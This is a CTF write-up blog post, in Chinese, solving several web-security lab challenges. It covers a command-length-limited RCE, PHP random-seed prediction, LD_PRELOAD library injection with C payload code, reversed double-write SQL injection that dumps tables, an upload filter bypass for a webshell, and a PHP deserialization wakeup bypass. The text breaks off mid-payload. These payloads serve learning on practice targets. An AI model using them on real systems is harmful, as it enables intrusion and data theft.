<h1 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h1><p><img src="https://pic1.imgdb.cn/item/67b72c59d0e0a243d4010ef4.png"><br>随便输入一条命令，跳转到post.php 然后提示命令已在.&#x2F;tmp&#x2F; 目录下成功执行<br>准备输入<code>ping -c2 192.168.112.11 </code>验证命令是否执行，但是返回<code>你也太长了吧，删除你的 tmp 目录了</code><br>然后可以逐渐增加命令长度，最终得出命令长度的限制是6<br>这里要了解几个linux中的知识，<code>*</code>会把目录中的第一个匹配到的文件名当作命令 剩下的文件名当作参数执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="keyword">/tmp/</span>web]</span><br><span class="line">└─<span class="meta"># &gt;nl</span></span><br><span class="line">^C                        </span><br><span class="line">┌──(root㉿kakeru)-[~<span class="keyword">/tmp/</span>web]</span><br><span class="line">└─<span class="meta"># ls</span></span><br><span class="line">nl                      </span><br><span class="line">┌──(root㉿kakeru)-[~<span class="keyword">/tmp/</span>web]</span><br><span class="line">└─<span class="meta"># &gt;a                 </span></span><br><span class="line">^C                    </span><br><span class="line">┌──(root㉿kakeru)-[~<span class="keyword">/tmp/</span>web]</span><br><span class="line">└─<span class="meta"># *</span></span><br><span class="line"><span class="symbol">a:</span> command not found</span><br></pre></td></tr></table></figure></div>
<p>这里就是创建了一个nl文件，用<code>*</code>就回执行nl指令，然后剩下的a当作参数执行<br>那现在这个命令长度限制的问题已经解决了，现在如何解决没有回显的问题呢？<br>用到的是重定向符<code>&gt;</code>这个可以把输出重定向一个文件中，因为题目告诉我们了目录是tmp所以我们可以访问&#x2F;tmp的文件<br>比如我现在用ls命令看现在根文件夹下面有什么  <code>ls &gt;a</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TCL"><figure class="iseeu highlight /tcl"><table><tr><td class="code"><pre><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line"><span class="keyword">proc</span><span class="title"></span></span><br><span class="line"><span class="title">root</span></span><br><span class="line">run<span class="title"></span></span><br><span class="line"><span class="title">sbin</span></span><br><span class="line">srv<span class="title"></span></span><br><span class="line"><span class="title">sys</span></span><br><span class="line">tmp<span class="title"></span></span><br><span class="line"><span class="title">usr</span></span><br><span class="line">var</span><br></pre></td></tr></table></figure></div>
<p>现在知道了flag的位置，就可以用<code>*</code>的方法查看文件了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">cat</span>  <span class="comment">#创建一个cat文件，利用文件名执行命令</span></span><br><span class="line"></span><br><span class="line">* /*&gt;b  <span class="comment"># 执行cat命令读根目录下面所有的文件重定向到b文件里</span></span><br><span class="line"></span><br><span class="line">http://node5.anna.nssctf.cn:20381/tmp/b <span class="comment">#访问b得到flag</span></span><br></pre></td></tr></table></figure></div>

<h1 id="phonecode"><a href="#phonecode" class="headerlink" title="phonecode"></a>phonecode</h1><p><img src="https://pic1.imgdb.cn/item/67b731b5d0e0a243d4010fe3.png"><br>随便输入之后跳转到login.php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Hint</span> :<span class="number">503573603</span></span><br><span class="line"><span class="attribute">Fool</span>!</span><br></pre></td></tr></table></figure></div>
<p>但是我换了输入之后这个hint也跟着变了<br>这题完全不懂，看了别的wp知道这个是随机数<br>mt_srand()<br>作用：mt_srand(seed) 用于 初始化随机数生成器，其中 seed 是随机数种子。<br>影响：如果使用相同的 seed，那么后续调用 mt_rand() 生成的随机数 始终相同。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);  <span class="comment">// 设置随机数种子</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;\n&quot;</span>;  <span class="comment">// 生成第一个随机数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;\n&quot;</span>;  <span class="comment">// 生成第二个随机数</span></span><br><span class="line"></span><br><span class="line"><span class="number">895547922</span></span><br><span class="line"><span class="number">2141438069</span></span><br></pre></td></tr></table></figure></div>
<p>每次运行之后的结果都是这两个数字不会变，所以只要固定种子，随机出来的值就是固定的<br>这里的phone就是种子  因为显示的是第一个随机数，那就把第二数当作验证码发送就可以得到flag</p>
<h1 id="uploadandinject"><a href="#uploadandinject" class="headerlink" title="uploadandinject"></a>uploadandinject</h1><p>预备知识：<br>LD_PRELOAD 是 Linux 系统中的一个环境变量，用于在程序运行时动态加载指定的共享库。LD_PRELOAD 的作用是在程序运行前，将指定的共享库加载到程序的内存中。这样，程序在运行时会优先使用该共享库中的符号，而不是系统默认的符号。LD_PRELOAD 可以用于替换程序本身的函数，增加程序的功能或者调试程序。</p>
<p>LD_PRELOAD 的工作原理是，当程序需要调用某个符号时，系统会先在程序自身的符号表中查找，如果找不到，则会在 LD_PRELOAD 指定的共享库中查找。如果在 LD_PRELOAD 指定的共享库中找到了该符号，则使用该符号中的代码。</p>
<p>使用 LD_PRELOAD 可以实现一些特殊的功能，例如：</p>
<p>动态库劫持：可以用 LD_PRELOAD 来劫持程序中的函数，替换为自己编写的函数，实现一些特殊的功能。</p>
<p>程序调试：可以用 LD_PRELOAD 来替换程序中的函数，增加一些调试信息，例如，在程序中调用 printf 函数时，可以用 LD_PRELOAD 来替换为自己编写的函数，输出调试信息。</p>
<p>库版本控制：可以用 LD_PRELOAD 来强制程序使用指定版本的共享库，以避免程序在不同版本的环境中产生兼容性问题。</p>
<p><img src="https://pic1.imgdb.cn/item/67b73afcd0e0a243d4011266.png"><br>这里提示先去hint.php看看有什么<br><img src="https://pic1.imgdb.cn/item/67b73b6bd0e0a243d4011273.png"><br>这里有一个.swp文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># curl http://node5.anna.nssctf.cn:26479/.index.php.swp &gt; index.php.swp</span></span><br><span class="line">  % <span class="title class_">Total</span>    % <span class="title class_">Received</span> % <span class="title class_">Xferd</span>  <span class="title class_">Average</span> <span class="title class_">Speed</span>   <span class="title class_">Time</span>    <span class="title class_">Time</span>     <span class="title class_">Time</span>  <span class="title class_">Current</span></span><br><span class="line">                                 <span class="title class_">Dload</span>  <span class="title class_">Upload</span>   <span class="title class_">Total</span>   <span class="title class_">Spent</span>    <span class="title class_">Left</span>  <span class="title class_">Speed</span></span><br><span class="line"><span class="number">100</span> <span class="number">12288</span>  <span class="number">100</span> <span class="number">12288</span>    <span class="number">0</span>     <span class="number">0</span>   <span class="number">104</span>k      <span class="number">0</span> --<span class="symbol">:--</span><span class="symbol">:--</span> --<span class="symbol">:--</span><span class="symbol">:--</span> --<span class="symbol">:--</span><span class="symbol">:--</span>  <span class="number">104</span>k</span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># vim -r index.php.swp</span></span><br></pre></td></tr></table></figure></div>
<p>这里本机下载这个文件（记得后缀名要是.swp） 然后用 vim -r 恢复交换文件查看，看到源代码<br><img src="https://pic1.imgdb.cn/item/67b73d1ad0e0a243d40112b4.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line">putenv(<span class="string">&quot;LD_PRELOAD=/var/www/html/$img_path&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></div>
<p>这里用到了LD_PRELOAD。想要利用这个LD_PRELOAD就要上传.so文件，现在先找到上传的地方</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># dirsearch -u http://node5.anna.nssctf.cn:26479/</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/http_node5.anna.nssctf.cn_26479/__25-02-20_22-41-01.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span>node5.anna.nssctf.cn:<span class="number">26479</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">01</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span>                                   </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span>                                 </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span>                                     </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span>                                  </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span>                                    </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span>                                     </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.html</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span>                                   </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span>                                       </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">15</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span>                                      </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">16</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">12</span>KB <span class="operator">-</span> <span class="symbol">/.index.php.swp</span>                                   </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">37</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">288</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">41</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">338</span>B  <span class="operator">-</span> <span class="symbol">/upload</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span>node5.anna.nssctf.cn:<span class="number">26479</span><span class="operator">/</span>upload<span class="symbol">/</span></span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">41</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">86</span>B  <span class="operator">-</span> <span class="operator">/</span>upload<span class="symbol">/</span>                                          </span><br><span class="line">[<span class="number">22</span>:<span class="number">41</span>:<span class="number">41</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">277</span>B  <span class="operator">-</span> <span class="symbol">/upload/upload.php</span>   </span><br></pre></td></tr></table></figure></div>
<p>上传的地点在&#x2F;upload&#x2F;upload.php</p>
<p>有两种常见的利用代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;cat /f*&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span> </span>&#123;   <span class="comment">//需要搜索查看函数的原型</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">payload</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">before</span><span class="params">(<span class="type">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">before</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;cat /f*&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67b7443fd0e0a243d4011428.png"><br>但是这里对上传的文件类型有点限制,修改后缀名为jpg后上传<br>最后到主页访问上传之后的路径就得到flag</p>
<h1 id="websign"><a href="#websign" class="headerlink" title="websign"></a>websign</h1><p><img src="https://pic1.imgdb.cn/item/67b846ccd0e0a243d4015de5.png"><br>提示看源码，但是这里f12和右键都被禁用了，可以在url修改，加上view-source:就可以了</p>
<h1 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h1><p><img src="https://pic1.imgdb.cn/item/67b86675d0e0a243d401672a.png"><br>通过这里的回显可以看到是什么过滤了<br>通过输入几个常见的字符，发现<code>or from ro </code>被过滤，而且输入的内容会倒序输出<br>这里过滤了这些关键字，但是其实是替换成空格，用双写绕过就可以,然后可以自己写一个python脚本反转就可以</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">for <span class="selector-tag">i</span> in range(<span class="number">100</span>):</span><br><span class="line">    s = <span class="built_in">input</span>(<span class="string">&quot;输入字符&quot;</span>);</span><br><span class="line">    print (s<span class="selector-attr">[::-1]</span>)</span><br></pre></td></tr></table></figure></div>
<p>双写绕过示例：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">输入字符<span class="keyword">from</span></span><br><span class="line">morf</span><br><span class="line"></span><br><span class="line">payload:mofromrf</span><br><span class="line">your <span class="keyword">sql</span>:<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> passwd=(<span class="string">&#x27;from&#x27;</span>) <span class="keyword">AND</span> username=(<span class="string">&#x27;&#x27;</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">false</span></span><br></pre></td></tr></table></figure></div>
<p>我们先倒序输入想要执行的被过滤的命令，然后在中间插入被过滤的指令，这样子中间的会被过滤，最后就能拼接出指令<br>后面就用正常的sql思路了 (中间自行用双写绕过)</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>爆库</span><br><span class="line">输入字符<span class="number">1</span><span class="string">&#x27;) union select 1,database()# </span></span><br><span class="line"><span class="string">#)(esabatad,1 tceles noinu )&#x27;</span><span class="number">1</span></span><br><span class="line">Your <span class="keyword">Login</span> <span class="type">name</span>:<span class="number">1</span></span><br><span class="line">Your <span class="keyword">Password</span>:UUCTF</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>爆表</span><br><span class="line">输入字符<span class="number">1</span><span class="string">&#x27;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database();#</span></span><br><span class="line"><span class="string">#;)(esabatad=amehcs_elbat erehw selbat.amehcs_noitamrofni morf )eman_elbat(tacnoc_puorg,1 tceles noinu )&#x27;</span><span class="number">1</span></span><br><span class="line">Your <span class="keyword">Login</span> <span class="type">name</span>:<span class="number">1</span></span><br><span class="line">Your <span class="keyword">Password</span>:flag,users</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>爆字段</span><br><span class="line">输入字符<span class="number">1</span><span class="string">&#x27;) union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">#&#x27;</span>galf<span class="string">&#x27;=eman_elbat erehw snmuloc.amehcs_noitamrofni morf )eman_nmuloc(tacnoc_puorg,1 tceles noinu )&#x27;</span><span class="number">1</span></span><br><span class="line">your <span class="keyword">sql</span>:<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> passwd=(<span class="string">&#x27;1&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">&#x27;flag&#x27;</span>#<span class="string">&#x27;) AND username=(&#x27;&#x27;) LIMIT 0,1</span></span><br><span class="line"><span class="string">Your Login name:1</span></span><br><span class="line"><span class="string">Your Password:UUCTF</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4.爆值</span></span><br><span class="line"><span class="string">输入字符1&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="string">&#x27;UUCTF&#x27;</span>) <span class="keyword">from</span> UUCTF.flag#</span><br><span class="line"><span class="meta">#galf.FTCUU morf )FTCUU(tacnoc_puorg,1 tceles noinu )&#x27;1</span></span><br></pre></td></tr></table></figure></div>


<h1 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h1><p><img src="https://pic1.imgdb.cn/item/67b88fa6d0e0a243d40171b2.png"><br>先随便上传一个普通的一句话木马看看有什么限制<br><img src="https://pic1.imgdb.cn/item/67b89015d0e0a243d40171be.png"><br>先是怀疑只是在前端做校验，然后用bp修改后缀试试。但是还是这个<br>然后用插件检测一下服务器，发现是apache，那就用.htaccess文件，这个文件是apache服务的一个解析配置文件<br>我们让这个目录下的.jpg文件都解析成php文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="comment">#.htaccess</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;/.jpg$&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>但是上传这个文件发现也被过滤，还有一个和这个功能类似的配置文件叫做.user.ini,可以上传</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="INI"><figure class="iseeu highlight /ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=<span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure></div>
<p>这个配置文件的意思是每个php文件在执行之前都会包含1.jpg这个文件，并且当作php执行，但是这里没有什么可以执行的php文件<br>看其他大佬的wp学习到了原来是要用apache解析漏洞<br>Apache 解析漏洞主要是因为 Apache 默认一个文件可以有多个用。分割得后缀，当最右边的后缀无法识别（mime.types 文件中的为合法后缀）则继续向左看，直到碰到合法后缀才进行解析（以最后一个合法后缀为准）<br>所以我们可以修改一个不合法的后缀，比如这个文件名改成<code>2.php.aaa</code>这样子解析的时候就会解析成php文件<br>但是还要注意用bp修改一下MIME 修改成jpg格式绕过MIME检测<br><img src="https://pic1.imgdb.cn/item/67b89695d0e0a243d40172cb.png"><br>发现成功上传    文件存储在: upload&#x2F;2.php.aaa.php<br>然后可以用蚁剑连接找到flag了</p>
<h1 id="ez-unser"><a href="#ez-unser" class="headerlink" title="ez_unser"></a>ez_unser</h1><p>题目</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">###very___so___easy!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;你输入的不正确！！！搞什么！！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">你输入的不正确！！！搞什么！！</span><br></pre></td></tr></table></figure></div>
<p>最终我们想执行<code>eval($this-&gt;a);</code>我们就让<code>$this -&gt; a</code>成为我们想要执行的命令<br>但是这里的wakeup会把a重新赋值，之前绕过wakeup的方法是修改序列化中的变量个数，但是这里多了限制，不让修改<br>这里利用的是<code>$this-&gt;b=$this-&gt;c</code>，php中如果两个变量同时指向一个地址也可以绕过wakeup，和ezpop中的绕过方法一样<br>原理就是我们让b指向a的地址，b值修改的时候，因为公用一片内存就回让a的值也变了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$x</span> -&gt; b = &amp;<span class="variable">$x</span> -&gt; a;</span><br><span class="line"><span class="variable">$x</span> -&gt; c = <span class="string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;R:<span class="number">2</span>;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">18</span>:<span 